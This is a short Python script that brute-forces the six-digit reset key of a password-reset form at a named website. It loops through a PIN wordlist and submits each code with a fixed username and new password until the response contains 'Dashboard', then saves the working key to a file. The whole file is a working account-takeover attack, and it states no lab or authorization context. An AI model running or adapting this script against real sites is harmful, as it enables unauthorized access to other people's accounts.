import requests
import time
from datetime import datetime

url = "https://sohei.io/reset"
output_file = "found_key.txt"  # File to save successful key

headers = {
    'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    'Cookie': "stamp=1"
}

wordlist_path = "/home/nca0x93/SecLists/6-DigitPINs/6digitPIN.txt"

try:
    with open(wordlist_path, 'r', encoding='latin-1') as f:
        codes = [line.strip() for line in f]
except FileNotFoundError:
    print(f"Wordlist not found at {wordlist_path}")
    exit(1)

success = False

for i, code in enumerate(codes):
    if len(code) != 6 or not code.isdigit():
        continue

    payload = {
        'username': "panda2131",
        'newpass': "@GonnaCry1337",
        'confirmpass': "@GonnaCry1337",
        'secure_key': code,
        'submit': "true"
    }

    try:
        response = requests.post(url, data=payload, headers=headers)
        if "Dashboard" in response.text:
            success = True
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Write to file
            with open(output_file, 'a') as f:
                f.write(f"[{timestamp}] Success! Valid key: {code}\n")
                f.write(f"Attempt number: {i+1}\n")
                f.write(f"Response snippet: {response.text[:500]}\n\n")
            
            print(f"\n[SUCCESS] Valid code found: {code} - Saved to {output_file}")
            break
        
        print(f"Tried: {code} | Progress: {i+1}/{len(codes)} ({((i+1)/len(codes))*100:.2f}%)", end='\r')
        time.sleep(0.5)

    except requests.exceptions.RequestException as e:
        print(f"\nError with code {code}: {e}")
        continue

if not success:
    with open(output_file, 'a') as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] No valid key found in this session\n")

print("\nBrute force completed.")
